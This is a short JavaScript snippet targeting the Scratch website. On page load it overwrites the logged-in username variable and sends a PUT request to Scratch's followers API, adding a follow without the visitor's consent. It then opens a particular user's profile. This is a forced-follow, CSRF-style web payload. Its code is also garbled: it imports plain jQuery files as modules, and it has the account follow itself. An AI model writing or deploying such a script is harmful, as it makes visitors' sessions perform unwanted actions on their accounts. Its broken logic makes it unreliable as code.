import "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
import "https://cdn.scratch.mit.edu/scratchr2/static/__d227dda79ab53b07e3b30c100291aaac__//js/jquery.min.js"
Scratch.INIT_DATA.LOGGED_IN_USER.model.username = "f_account"

function followme() {
    $.ajax({
        type: "PUT",
        url: "http://scratch.mit.edu/site-api/users/followers/" + "f_account" + "/add/",
        data: {usernames: Scratch.INIT_DATA.LOGGED_IN_USER.model.username}
    });
    window.open("https://scratch.mit.edu/users/khuDDD")
}
window.onload = followme;
